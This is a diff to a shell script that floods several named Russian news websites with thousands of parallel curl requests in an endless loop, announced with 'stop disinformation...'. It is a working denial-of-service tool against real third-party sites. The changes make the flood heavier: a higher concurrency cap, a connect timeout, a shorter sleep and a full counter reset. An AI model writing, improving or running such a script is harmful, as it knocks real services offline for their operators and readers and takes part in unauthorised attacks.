@@ -4,7 +4,7 @@ TARGETS="https://lenta.ru/ https://ria.ru/ https://ria.ru/lenta/ https://www.rbc
 
 echo 'stop disinformation...'
 
-MAX_REQUESTS=1000
+MAX_REQUESTS=3000
 CURRENT_PARRALEL_REQUESTS=1
 
 echo $CURRENT_PARRALEL_REQUESTS
@@ -14,7 +14,7 @@ do
     if [ $CURRENT_PARRALEL_REQUESTS -lt $MAX_REQUESTS ]
     then
         for TARGET in ${TARGETS}; do
-            curl --insecure --silent --output /dev/null --show-error -X GET ${TARGET} &            
+            curl --insecure --silent --output /dev/null --show-error --connect-timeout 10 -X GET ${TARGET} &            
             CURRENT_PARRALEL_REQUESTS=$(($CURRENT_PARRALEL_REQUESTS+1))
         done
     fi
@@ -24,8 +24,8 @@ do
     fi
     if [ $CURRENT_PARRALEL_REQUESTS -eq $MAX_REQUESTS ]
     then
-        sleep 100
-        CURRENT_PARRALEL_REQUESTS=$(($CURRENT_PARRALEL_REQUESTS-1))
+        sleep 10
+        CURRENT_PARRALEL_REQUESTS=0
     fi
 
 done
